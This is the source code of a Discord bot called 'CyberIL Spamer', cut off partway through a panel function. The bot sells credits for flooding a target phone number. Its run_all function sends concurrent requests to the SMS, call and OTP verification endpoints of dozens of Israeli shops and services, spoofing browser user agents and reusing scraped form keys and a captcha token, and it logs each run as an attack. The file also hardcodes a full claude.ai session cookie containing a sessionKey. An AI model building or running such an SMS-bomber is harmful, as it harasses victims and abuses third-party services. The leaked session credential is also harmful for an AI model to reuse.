import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import time
import random
import uuid
import aiohttp
from motor.motor_asyncio import AsyncIOMotorClient
import logging
import re
import sys
import os
from datetime import datetime, timezone
import certifi

TOKEN = os.getenv("DISCORD_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
DB_NAME = "CyberIL_Spamer"

PANEL_CHANNEL = 1481957038241353779
GIFT_CHANNEL = 1485104425625325709
INFO_CHANNEL = 1485125569690603692

ADMIN_ROLE_ID = 1480762750052601886
STORE_URL = "https://discord.gg/3CxwPGuGyq"

COOLDOWN_TIME = 20
MAX_CREDIT_SPEND = 100
LAUNCH_DELAY = 3

# עיצוב חדש - צבעים מודרניים
COLOR_PRIMARY = 0x2B2D31
COLOR_ACCENT = 0x5865F2
COLOR_SUCCESS = 0x23A55A
COLOR_DANGER = 0xDA373C
COLOR_WARNING = 0xFEE75C
COLOR_INFO = 0x1E1F22

CLAUDE_SESSION = "activitySessionId=8e5e644c-d640-4b9f-be61-59b9a138a42b; anthropic-device-id=4ed16e2b-8252-4456-8e7a-e466ede65652; _fbp=fb.1.1773186995656.51415631283246056; app-shell-mode=gate-disabled; CH-prefers-color-scheme=light; __ssid=aac9d1c5-0950-4438-b7ea-a89a1639d015; cookie_seed_done=1; intercom-device-id-lupk8zyo=f68271ce-ab05-40b7-b143-901ad283a161; user-sidebar-visible-on-load=true; user-recents-collapsed=false; user-sidebar-pinned=true; g_state={\"i_l\":0,\"i_ll\":1773414635601,\"i_b\":\"y3RrxvHpC/63IgqxQoW+FkAztdzRlQfKqrSCo5paIW4\",\"i_e\":{\"enable_itp_optimization\":0},\"i_t\":1773501035602}; __cf_bm=3VjDxw6wkQm2wlbHFDvk8MaDT_DB6R36F4R.MVnz0p4-1773447632-1.0.1.1-6q05RiFdtxB27W.Dlk8sZzMKN2_GWuJqrNh03eIFieCaneWW7KiQJxVTVTNIxcxA4EeiLytjTSnQLzFe5XvedaBVzIzDp_EoeqS.drKNHic; _cfuvid=zbw_U3cChwMfKZyPfROexrLBbuzQTKW2FW6ko.UebTU-1773447632362-0.0.1.1-604800000; __stripe_mid=eabdbe50-cd60-4100-9f89-6403dde971eb6b036c; __stripe_sid=7b2497e5-5647-4528-aa38-9272e68de8c5289f41; sessionKey=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; lastActiveOrg=2b096853-0284-4d04-8bee-d3d6eb9ec7b1; cf_clearance=CM9MGR4oytc4fDuAdMWrgtGLrwjHrZfyGjDHQmELKWs-1773447692-1.2.1.1-8qu2TBglm35vOa3Y5dwU3Ue0D7gBkTfD20EtG9u.GXPEkWyTnnSOlsalbwktHG1lj9TvVOnuD19OeZaXbAIFnPMBAT3VnNkt2Rg5J8MQ9qAXN3Wf3DwDbPI.qiNUmVZwwvjmHdyRkI.fuz248__ESMWvCdMkeASIwHP7DT5e14INWZ3.iSxdKpFmZwoKzVGj1ge2Bba07dhQbqnbXVM1J7Ov4yMposOalAOKdx7hZN4; ajs_user_id=34d05785-fcf5-4298-8314-ac95766337ff; ajs_anonymous_id=64ed414c-6982-4d71-803f-2241e4e9546a; intercom-session-lupk8zyo=QTJuM3pjOVY3bWs1Njc4T0ZBQlZ1T2V6OUx0bjREempveE5JalZsR0FNMEpZYjdXZ3BYUE83WnhxYXV4S0tZSTdORlluTUc2OE14UnVCRHhBcjlzdE42SFo1ZW1NK1hWeEtZeTA0Y0hYYzlvcTN0RlBCa2YxV3JRbGJHM1B4WFltZVNNWk1QUXhWMzBEclNvUFphUTZNNTV0dk12T2s5QzhYSGN2U0pkeWNHM2NSOEZyMUU3amxwU2N5MGc4VkRpVEFZS0JrQzF3MFUyc2pzZlJyV0lTdXlDNncvYUYzcjQ1UkRkbzdmRTA1MnhiSHliZSt0akc2NjBzdjUyV2VwVkNQZ3ptd09xRzZZOTJMMXZEUzFVNmxxb3RTNG1ZYWs1K3Y5RFBTQXhiM1k9LS1YdEp3STBsUkF2S2FWSFptb29sYzFnPT0=--94e9f81d682285fead0655379f59452a0e43ab83; routingHint=sk-ant-rh-eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJFUzI1NiIsICJraWQiOiAiN0MxcWFPRnhqdWxaUjRFQnNuNk1UeUZGNWdDV2JHbFpNVDR2RklrRFFpbyJ9.eyJzdWIiOiAiMzRkMDU3ODUtZmNmNS00Mjk4LTgzMTQtYWM5NTc2NjMzN2ZmIiwgImlhdCI6IDE3NzM0NDc2OTYsICJpc3MiOiAiY2xhdWRlLWFpLXJvdXRpbmciLCAib25ib2FyZGluZ19jb21wbGV0ZSI6IHRydWUsICJwaG9uZV92ZXJpZmllZCI6IGZhbHNlLCAiYWdlX3ZlcmlmaWVkIjogdHJ1ZSwgImxvY2FsZSI6ICJlbi1VUyJ9.yRj_WgY7-XZbfW8XvjAb8ybkDmv2wDhrNH2WqAywFX2DVfMGZayA92Tj5WJwB3-kcV2JC3Un2eERG-bLEPQlAw; _gcl_au=1.1.357471279.1773367551.67089487.1773447650.1773447710; _dd_s=aid=631a5dba-fcfc-4e29-854f-58b2ec36a49d&rum=0&expire=1773448656835"

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

client = commands.Bot(command_prefix="!", intents=intents)
tree = client.tree

mongo_connection = AsyncIOMotorClient(MONGO_URI, tlsCAFile=certifi.where())
database = mongo_connection[DB_NAME]
users_collection = database["users"]
cooldown_collection = database["cooldowns"]
settings_collection = database["settings"]
logs_collection = database["attack_logs"]

logging.basicConfig(level=logging.WARNING)

active_missions = {}
cooldown_tracker = {}

BROWSER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/145.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.4.1 Safari/605.1.15"
]

def random_agent():
    return random.choice(BROWSER_AGENTS)

async def fetch_balance(user_id: int) -> int:
    record = await users_collection.find_one({"_id": user_id})
    if not record:
        return 0
    if record.get("unlimited"):
        return 999999
    return record.get("credits", 0)

async def has_unlimited(user_id: int) -> bool:
    record = await users_collection.find_one({"_id": user_id})
    return bool(record and record.get("unlimited"))

async def format_balance(user_id: int) -> str:
    if await has_unlimited(user_id):
        return "∞"
    return str(await fetch_balance(user_id))

async def add_credits(user_id: int, amount: int):
    await users_collection.update_one({"_id": user_id}, {"$inc": {"credits": amount}}, upsert=True)

async def remove_credits(user_id: int, amount: int):
    await users_collection.update_one({"_id": user_id}, {"$inc": {"credits": -amount}}, upsert=True)

async def set_unlimited(user_id: int, status: bool):
    await users_collection.update_one({"_id": user_id}, {"$set": {"unlimited": status}}, upsert=True)

async def use_credit(user_id: int) -> bool:
    if await has_unlimited(user_id):
        return True
    result = await users_collection.update_one(
        {"_id": user_id, "credits": {"$gte": 1}},
        {"$inc": {"credits": -1}}
    )
    return result.modified_count == 1

async def check_cooldown(target: str):
    record = await cooldown_collection.find_one({"target": target})
    if not record:
        return False, 0
    elapsed = time.time() - record["last_attempt"]
    if elapsed < COOLDOWN_TIME:
        return True, int(COOLDOWN_TIME - elapsed)
    return False, 0

async def apply_cooldown(target: str):
    await cooldown_collection.update_one({"target": target}, {"$set": {"last_attempt": time.time()}}, upsert=True)

def is_admin(interaction: discord.Interaction) -> bool:
    return ADMIN_ROLE_ID in [role.id for role in interaction.user.roles]

async def save_log(user_id: int, username: str, phone: str, cost: int, success: int, failed: int, duration: int):
    entry = {
        "user_id": user_id,
        "username": username,
        "phone": phone,
        "cost": cost,
        "success_count": success,
        "failed_count": failed,
        "total": success + failed,
        "duration": duration,
        "timestamp": datetime.now(timezone.utc),
        "date": datetime.now(timezone.utc).strftime("%Y-%m-%d"),
        "time": datetime.now(timezone.utc).strftime("%H:%M:%S")
    }
    await logs_collection.insert_one(entry)

async def send_request(session, url, form=None, json_data=None, headers_extra=None, tag="", method="POST", data=None):
    headers = {
        "User-Agent": random_agent(),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    if headers_extra:
        headers.update(headers_extra)
    
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        
        if method == "GET":
            async with session.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
                await resp.read()
                return resp.status < 500, tag
        elif json_data is not None:
            headers.setdefault("Content-Type", "application/json")
            async with session.post(url, json=json_data, headers=headers, timeout=timeout, ssl=False) as resp:
                await resp.read()
                return resp.status < 500, tag
        elif data is not None:
            async with session.post(url, data=data, headers=headers, timeout=timeout, ssl=False) as resp:
                await resp.read()
                return resp.status < 500, tag
        else:
            async with session.post(url, data=form, headers=headers, timeout=timeout, ssl=False) as resp:
                await resp.read()
                return resp.status < 500, tag
    except:
        return False, tag

async def atmos_request(session, store_id, phone, is_call=False):
    tag = "atmos_call" if is_call else "atmos"
    fd = aiohttp.FormData()
    fd.add_field("restaurant_id", store_id)
    fd.add_field("phone", phone)
    fd.add_field("testing", "false")
    h = {
        "User-Agent": random_agent(),
        "accept": "application/json, text/plain, */*",
        "accept-language": "he-IL,he;q=0.9",
        "origin": "https://order.atmos.rest",
        "referer": "https://order.atmos.rest/",
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        endpoint = "sendValidationCall" if is_call else "sendValidationCode"
        api_url = f"https://api-ns.atmos.co.il/rest/{store_id}/auth/{endpoint}"
        async with session.post(api_url, data=fd, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            return resp.status < 500, tag
    except:
        return False, tag

async def mitmachim_request(session, phone):
    tag = "mitmachim"
    url = "https://mitmachim.top/api/v3/plugins/MitMValidPhone"
    payload = {
        "action": "Send",
        "phone": phone,
        "recaptchaToken": "0cAFcWeA6zXYegigwq5FDvobKq4zt7jKXieB68_Lo7P5YI8P9a-fAKR_Jvb7zaEotjge6wDtGkYVHmyD_itP63HZL1q8LdgTkfEMsnRDrxZgt0z1f3UIr-ege1I-2tRpCKA1HT3fxIM2zXkwkNo5VhBgdJyxvSGjVTexzftxxSBmqoYWQOutqFvqtFbb0ayMzId7-n16rwETvNKoE9rGhgShxXwVV0U64NAcjzXGZewY29paeRGgsJpYPJuDF8DinitcgWayEiFCg7t1pyv_QZMh_OBZAVifspEydmV4eV0yU-OF4sUd-N2pS7VAGx9lIvO65NweuW56OklqhTXbd5ZKHF8T8ne88RWthDqWXLoSkkPKgA_gvCTb8n6E-UbCmIiDnsF6KLAZHubpOGxAbHN9CSMaL-EME1YybfVHcEzLpKLx4QOcA5cQy9DWv-lnHQcF1zNgqEF47Br80yKLylYOEUwsKHTK_rWBhxnBTS8nqw2rC1Qsc8rz6eA7_LUcMvRHg79yiyzVYMTN1BmX-jt0oOrBIHyASNu5F3R7ruaM9BN6gvEsFqTA9a8dB-cjrOhDPwjqzXgpfQaKRdfvDm8d8HIFUcAcJ0MK0buafCmgc5q7RfWCDUVIObDD62LXfdUTE3OuHbgG3lydZJiy1XOPP142LKhMLwitx3f3pk4ZSxuMeshzYTulx3uDB90cMurP2MIObat00LXFzAKunOn_CJFYFGEAN7N8thwNBQ8sTEN9kerQ8e1rzEqmNAssCOEHwmjq6Iljlw8sUAbYzebBW-TXdnbMK-SL6652rus2fnxRYy0E_Jtf5Nieij9i-XWHPOGBNCLbeGC9J18_fOaVAXQc2CvzG3CNZ7o60lQE2JIACB8ETDv74QSgAtJ1v50RzEbkpXJUKtfEAh06UrwaTmhrOfA9z34ijZFwApTRm3KbzCYzQNmhD6m6sCNTeqHVVUSNQRgYBn0Sj4UamN2gRkpGpxrn1ljlSYSZ51OtEuGMt-qQHZO92W5UG7D3Up_WpAcRjnnYi58-eCSjfO4BcCeoHybTk5AOhdex4pOuQAQEqeeki-Kz3TGzjmw1onIe0H01xhNOyOnUiQSxfndP7QkaHDKoveuL82-Vz7v1SXkzsvR8v26mSQ8hBvI2ogtszwg42jGojwIWQh97bRqhkYBBnpD-mtd-rEDDJWISHjO8RQ2EAQfALg0pZY2MfqRn5ipVF22o-f4Qi9FaB-nqyprHUvSZBbEhW4CuYk5DqTmq1Q_MmG0B0ob_VRIfkvdOBdzCRQawOkoNCRpP_HAryLQYXVHp4Q_1xjQCm5v3wtiXC-LovLCVbCgpmN_S6p978RLlIiEfz3c3kVRTCdt0RKgLjgJXAaFc-aDZAW8riRQMWrvguJFUQJupmCAUQx5owAmtoBXqtn1Sz5WU3AuG5NeSnfvz1GG_XYd2ckmGG8vDvGk1BXT_FTpiDJBa1yJX3VYOkTj8y6_il90GkmNncJkWR6b8Irly5ttetDZqMicF6UJE7G4Wab6t0YrXwhu_-nDF_hFT94oAXQ2Nn02N0ke11RAt_j8GaAnlQcCJBHsyE12Dk91GZOAUCLiIa8xC4AfG8ZqpjWsUAKq5EWOqBSdQjGvROMclJyPNubtkzAu1ATNQR8f6CUbv3CENHn8KCLKUO6AvIi_Zdp9hB_21stFV2tqfqPJzfQ7x_3gS7wqRUwIi1wXw__tNb3MJ-Tke7Dsc1lIgqOI9P_Z_hNYv08tvjFnh3LlSPBeabrwPcibA_6AChXqjvZ0iYREam4u_3hiL6EnEt-6NNw6wg9SL4lFZUzsHee_Uag-D-QBEu0CGOzsX6GgzlK3ROn_stIJIPrxK5DtzpgNF9HVJlnCtjigE2PB4JVAzB9FxSveyttyrP23Z77xDgi45p7WWUneWGnJyaICtxU3qZ1dB-Vy3ehbR6t-Yyjs8C5ekTrGrAOZEXimTkJLjRaC6n3e1YPvEf1XEZYfvKH55mLM85mlowxfJthE2NMm78eKtZVPOslRBGP6HEVt0I26spzrdFiAgh2fOnXI4zOyeWOmDo_ZEp_wpsy5sK7Bg"
    }
    h = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://mitmachim.top",
        "Referer": "https://mitmachim.top/register",
        "User-Agent": random_agent()
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with session.post(url, json=payload, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            return resp.status < 500, tag
    except:
        return False, tag

async def atmos_club_request(session, store_id, phone):
    tag = "atmos_club"
    fd = aiohttp.FormData()
    fd.add_field("restaurant_id", store_id)
    fd.add_field("phone", phone)
    fd.add_field("testing", "false")
    h = {
        "User-Agent": random_agent(),
        "accept": "application/json, text/plain, */*",
        "accept-language": "he-IL,he;q=0.9",
        "origin": "https://club-register.atmos.co.il",
        "referer": "https://club-register.atmos.co.il/",
    }
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        api_url = f"https://api-ns.atmos.co.il/rest/{store_id}/auth/sendValidationCode"
        async with session.post(api_url, data=fd, headers=h, timeout=timeout, ssl=False) as resp:
            await resp.read()
            return resp.status < 500, tag
    except:
        return False, tag

async def run_all(phone: str):
    raw = phone
    formatted = f"+972{raw[1:]}" if raw.startswith("0") else f"+972{raw}"
    sid = str(uuid.uuid4())
    random_email = f"user{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))}@gmail.com"
    
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as s:
        atmos_stores = [
            "1","2","3","4","5","7","8","13","15","18","21","23","24","27",
            "28","29","33","35","48","51","56","57","59",
            "2008","2011","2012","2014","2041","2052","2053","2056","2059",
            "2063","2070","2073","2076","2078","2087","2088","2091",
        ]
        
        tasks = []
        for store in atmos_stores:
            tasks.append(atmos_request(s, store, raw, False))
            tasks.append(atmos_request(s, store, raw, True))
        
        tasks.append(atmos_club_request(s, "23", raw))
        tasks.append(atmos_club_request(s, "59", raw))
        
        geteat_fd = aiohttp.FormData()
        geteat_fd.add_field("restaurant_id", "9")
        geteat_fd.add_field("phone", raw)
        geteat_fd.add_field("testing", "false")
        
        all_tasks = [
            send_request(s, "https://netfree.link/api/user/verify-phone/get-call",
                json_data={"agreeTou": True, "phone": formatted}, tag="netfree"),
            send_request(s, "https://claude.ai/api/auth/send_phone_code",
                json_data={"phone_number": formatted}, tag="claude"),
            send_request(s, "https://delivery.oshioshi.co.il/he/auth/register-send-code",
                form=f"phone={raw}", tag="oshioshi"),
            send_request(s, "https://middleware.freetv.tv/api/v1/send-verification-sms",
                json_data={"msisdn": formatted}, tag="freetv"),
            send_request(s, "https://us-central1-webcut-2001a.cloudfunctions.net/sendWhatsApp",
                json_data={"type": "otp", "data": {"phone": raw}}, tag="webcut"),
            send_request(s, "https://f2.freeivr.co.il/api/v3/plugins/MitMValidPhone",
                json_data={"phone": f"972{raw[1:]}"}, tag="freeivr"),
            mitmachim_request(s, raw),
            send_request(s, "https://www.negev-group.co.il/customer/ajax/post/",
                form=f"form_key=a93dnWr8cjYH8wZ2&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=", tag="negev"),
            send_request(s, "https://www.gali.co.il/customer/ajax/post/",
                form=f"form_key=xT4xBP6oaqFhxMVR&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=", tag="gali"),
            send_request(s, "https://www.aldoshoes.co.il/customer/ajax/post/",
                form=f"form_key=FD1Zm1GUMQXUivz6&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=", tag="aldo"),
            send_request(s, "https://www.hoodies.co.il/customer/ajax/post/",
                form=f"form_key=OCYFcuUfiQLCbya5&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=", tag="hoodies"),
            send_request(s, "https://api.gomobile.co.il/api/login",
                json_data={"phone": raw}, tag="gomobile"),
            send_request(s, "https://bonitademas.co.il/apps/imapi-customer",
                json_data={"action":"login","otpBy":"sms","otpValue":raw}, tag="bonita"),
            send_request(s, "https://story.magicetl.com/public/shopify/apps/otp-login/step-one",
                json_data={"phone": raw}, tag="story"),
            send_request(s, "https://www.crazyline.com/customer/ajax/post/",
                form=f"form_key=qjDmQDc2pwYJIEin&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=", tag="crazy"),
            send_request(s, "https://authentication.wolt.com/v1/captcha/site_key_authenticated",
                json_data={"phone_number": raw, "operation": "request_number_verification"}, tag="wolt"),
            send_request(s, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?uuid=4c48ed0d-9622-4a1e-ac70-2821631b680b&apiKey=BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54&sessionID=24014c96-61ca-4cd6-87a9-9324aa2f3150&culture=he_IL&apiVersion=2",
                json_data={"phoneNumber": raw, "isCalling": True}, tag="mishloha"),
            send_request(s, "https://www.golfkids.co.il/customer/ajax/post/",
                form=f"form_key=XB0c9tAkTouRgHrI&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=", tag="golfkids"),
            send_request(s, "https://www.onot.co.il/customer/ajax/post/",
                form=f"form_key=xmemtkBNMoUSLrMN&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=", tag="onot"),
            send_request(s, "https://fox.co.il/apps/dream-card/api/proxy/otp/send",
                json_data={"phoneNumber":raw,"uuid":"498d9bb2-0fa8-4d9c-9e71-f44fcbcd2195"}, tag="fox"),
            send_request(s, "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send",
                json_data={"phoneNumber":raw,"uuid":"6db5a63b-6882-414f-a090-de263dd917d7"}, tag="foxhome"),
            send_request(s, "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send",
                json_data={"phoneNumber":raw,"uuid":"ab29f239-0637-4c8e-8af5-fdfbaeb4b493"}, tag="laline"),
            send_request(s, "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send",
                json_data={"phoneNumber":raw,"uuid":"9961459f-9f83-4aab-9cee-58b1f6793547"}, tag="footlocker"),
            send_request(s, "https://www.golfco.co.il/customer/ajax/post/",
                form=f"form_key=SIiL0WFN6AtJF6lb&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=", tag="golfco"),
            send_request(s, "https://www.timberland.co.il/customer/ajax/post/",
                form=f"form_key=gU7iqYv5eiwuKVef&bot_validation=1&type=login&phone={raw}", tag="timberland"),
            send_request(s, "https://www.solopizza.org.il/_a/aff_otp_auth",
                form=f"value={raw}&type=phone&projectId=1", tag="solopizza"),
            send_request(s, "https://users-auth.hamal.co.il/auth/send-auth-code",
                json_data={"value":raw,"type":"phone","projectId":"1"}, tag="hamal"),
            send_request(s, "https://www.urbanica-wh.com/customer/ajax/post/",
                form=f"form_key=sucdtpszDEqdOgkv&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=", tag="urbanica"),
            send_request(s, "https://www.intima-il.co.il/customer/ajax/post/",
                form=f"form_key=ppjX1yBLuS9rB7zZ&bot_validation=1&type=login&country_code=972&telephone={raw}&code=&compare_email=&compare_identity=", tag="intima"),
            send_request(s, "https://www.steimatzky.co.il/customer/ajax/post/",
                form=f"form_key=4RmX16417urLzC5J&bot_validation=1&type=login&country_code=972&telephone={raw}&code=&compare_email=&compare_identity=", tag="steimatzky"),
            send_request(s, "https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type",
                form=f"value={raw}&value_type=", tag="globes"),
            send_request(s, "https://www.moraz.co.il/wp-admin/admin-ajax.php",
                form=f"action=validate_user_by_sms&phone={raw}&email=&from_reg=false", tag="moraz"),
            send_request(s, "https://itaybrands.co.il/apps/dream-card/api/proxy/otp/send",
                json_data={"phoneNumber": raw, "uuid": sid}, tag="itaybrands"),
            send_request(s, "https://www.spicesonline.co.il/wp-admin/admin-ajax.php",
                form=f"action=validate_user_by_sms&phone={raw}", tag="spicesonline"),
            send_request(s, "https://www.stepin.co.il/customer/ajax/post/",
                form=f"form_key=BxItwcIQhlhsnaoi&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=", tag="stepin"),
            send_request(s, "https://mobile.rami-levy.co.il/api/Helpers/OTP",
                form=f"phone={raw}&template=OTP&type=1", tag="ramilevy"),
            send_request(s, "https://api.zygo.co.il/v2/auth/create-verify-token",
                json_data={"phone": raw}, tag="zygo"),
            send_request(s, "https://ros-rp.tabit.cloud/services/loyalty/customerProfile/auth/mobile",
                json_data={"mobile": raw}, tag="tabit"),
            send_request(s, "https://ivr.business/api/Customer/getTempCodeToPhoneVarification", 
                method="GET", tag="ivr"),
            send_request(s, "https://www.call2all.co.il/ym/api/SelfCreateNewCustomer",
                data={"configCode": "ivr2_10_23", "phone": raw, "sendCodeBy": "CALL", "step": "SendValidPhone"}, tag="call2all"),
            send_request(s, "https://rest-api.dibs-app.com/otps",
                json_data={"phoneNumber": formatted}, tag="dibs"),
            send_request(s, "https://www.nine-west.co.il/customer/ajax/post/",
                form=f"bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=", tag="ninewest"),
            send_request(s, "https://www.leecooper.co.il/customer/ajax/post/",
                form=f"bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=", tag="leecooper"),
            send_request(s, "https://www.kikocosmetics.co.il/customer/ajax/post/",
                form=f"bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=", tag="kiko"),
            send_request(s, "https://www.topten-fashion.com/customer/ajax/post/",
                form=f"form_key=soiphrLs3vM2A1Ta&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=", tag="topten"),
            send_request(s, "https://www.lehamim.co.il/_a/aff_otp_auth",
                form=f"phone={raw}", tag="lehamim"),
            send_request(s, "https://www.555.co.il/ms/rest/otpservice/client/send/phone?contentContext=3&returnTo=/pearl/apps/vehicle-policy?insuranceTypeId=1",
                json_data={"password": None, "phoneNr": raw, "sendType": 1, "systemType": None}, tag="555"),
            send_request(s, "https://www.jungle-club.co.il/wp-admin/admin-ajax.php",
                form=f"action=simply-check-member-cellphone&cellphone={raw}", tag="jungleclub"),
            send_request(s, "https://blendo.co.il/wp-admin/admin-ajax.php",
                form=f"action=simply-check-member-cellphone&cellphone={raw}", tag="blendo"),
            send_request(s, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
                json_data={"phoneNumber": raw, "sourceFrom": "AuthJS", "isCalling": True}, tag="mishloha2"),
            send_request(s, "https://we.care.co.il/wp-admin/admin-ajax.php",
                form=f"post_id=351178&form_id=7079d8dd&referer_title=Care&queried_id=351178&form_fields[name]=CyberIL&form_fields[phone]={raw}&form_fields[email]={random_email}&form_fields[accept]=on&action=elementor_pro_forms_send_form&referrer=https://we.care.co.il/", tag="wecare"),
            send_request(s, "https://www.matara.pro/nedarimplus/V6/Files/WebServices/DebitBit.aspx?Action=CreateTransaction",
                form=f"MosadId=7000297&ClientName=CyberIL&Phone={raw}&Amount=100&Tashlumim=1", tag="matara"),
            send_request(s, "https://wissotzky-tlab.co.il/wp/wp-admin/admin-ajax.php",
                form=f"action=otp_register&otp_phone={raw}&first_name=Cyber&last_name=IL&email={random_email}&date_birth=2000-11-11&approve_terms=true&approve_marketing=true", tag="wissotzky"),
            send_request(s, "https://clocklb.ok2go.co.il/api/v2/users/login",
                json_data={"phone": raw}, tag="ok2go"),
            send_request(s, "https://api-endpoints.histadrut.org.il/signup/send_code",
                json_data={"phone": raw}, tag="histadrut"),
            send_request(s, "https://www.papajohns.co.il/_a/aff_otp_auth",
                form=f"phone={raw}", tag="papajohns"),
            send_request(s, "https://www.iburgerim.co.il/_a/aff_otp_auth",
                form=f"phone={raw}", tag="iburgerim"),
            send_request(s, "https://www.americanlaser.co.il/wp-json/calc/v1/send-sms",
                method="GET", tag="americanlaser"),
            send_request(s, "https://wb0lovv2z8.execute-api.eu-west-1.amazonaws.com/prod/api/v1/getOrdersSiteData",
                json_data={"id": sid, "domain": "5fc39fabffae5ac5a229cebb", "action": "generateOneTimer", "phoneNumber": raw}, tag="beecomm"),
            send_request(s, "https://xtra.co.il/apps/api/inforu/sms",
                json_data={"phoneNumber": raw}, tag="xtra"),
            send_request(s, "https://www.lighting.co.il/customer/ajax/post/",
                form=f"form_key=OoHXm6oGzca2WeJR&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=", tag="lighting"),
            send_request(s, "https://proxy1.citycar.co.il/api/verify/login",
                json_data={"phoneNumber": formatted, "verifyChannel": 2, "loginOrRegister": 1}, tag="citycar"),
            send_request(s, "https://www.lilit.co.il/customer/ajax/post/",
                form=f"form_key=sXWXnRwFsKy5YX9E&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=", tag="lilit"),
            send_request(s, "https://www.castro.com/customer/ajax/post/",
                form=f"bot_validation=1&type=login&telephone={raw}", tag="castro"),
            send_request(s, "https://www.bathandbodyworks.co.il/customer/ajax/post/",
                form=f"form_key=ckGbaafzIC4Yi2l8&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=", tag="bathandbody"),
            send_request(s, "https://www.golbary.co.il/customer/ajax/post/",
                form=f"form_key=w1deINjU3Ffpj8ct&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=", tag="golbary"),
            send_request(s, "https://api.getpackage.com/v1/graphql/",
                json_data={"operationName": "sendCheckoutRegistrationCode", "variables": {"userName": raw}, "query": "mutation sendCheckoutRegistrationCode($userName: String!) { sendCheckoutRegistrationCode(userName: $userName) { status __typename } }"}, tag="getpackage"),
            send_request(s, "https://ohmama.co.il/?wc-ajax=validate_user_by_sms",
                form=f"otp_login_nonce=de90e8f67b&phone={raw}&security=de90e8f67b", tag="ohmama"),
            send_request(s, "https://server.myofer.co.il/api/sendAuthSms",
                json_data={"phoneNumber": raw}, tag="myofer"),
            send_request(s, "https://arcaffe.co.il/wp-admin/admin-ajax.php",
                form=f"action=user_login_step_1&phone_number={raw}&step[]=1", tag="arcaffe"),
            send_request(s, "https://api.noyhasade.co.il/api/login?origin=web",
                json_data={"phone": raw, "email": False, "ip": "1.1.1.1"}, tag="noyhasade"),
            send_request(s, "https://api.geteat.co.il/auth/sendValidationCode",
                data=geteat_fd, tag="geteat"),
        ]
        
        all_tasks.extend(tasks)
        
        all_res = await asyncio.gather(*all_tasks, return_exceptions=True)
        success = 0
        
        for r in all_res:
            if isinstance(r, Exception):
                continue
            elif isinstance(r, tuple):
                ok, name = r
                if ok:
                    success += 1

        return success, len(all_res) - success

# עיצוב חדש ומודרני
def create_panel():
    embed = discord.Embed(
        title="",
        description="",
        color=COLOR_ACCENT
    )
    
    embed.set_author(
        name="CYBERIL SPAMER",
        icon_url="https://cdn.discordapp.com/emojis/1345678901234567890.png"
    )
    
    embed.add_field(
        name="╭───────────────╮",
        value="",
        inline=False
    )
    
    embed.add_field(
        name="│  🚀 **START**",
        value="│  לחץ על הכפתור למטה",
        inline=False
    )
    
    embed.add_field(
        name="│  💎 **CREDITS**",
        value=f"│  כל קרדיט = דקה אחת\n│  ללא הגבלת כמות",
        inline=False
    )
    
    embed.add_field(
        name="│  ⏱️ **COOLDOWN**",
        value=f"│  {COOLDOWN_TIME} שניות בין ספאם",
        inline=False
    )
    
    embed.add_field(
        name="│  📊 **STATUS**",
        value="│  מערכת פעילה",
        inline=False
    )
    
    embed.add_field(
        name="╰───────────────╯",
        value="",
        inline=False
    )
    
    embed.set_footer(
        text=f"© CYBERIL • {datetime.now().strftime('%d/%m/%Y')}",
        icon_url="https://cdn.discordapp.com/emojis/1345678901234567890.png"
    )
    
    return embed

def create_gift_panel():
    embed = discord.Embed(
        title="",
        description="",
        color=0xFFD700
    )
    
    embed.set_author(
        name="FREE CREDITS",
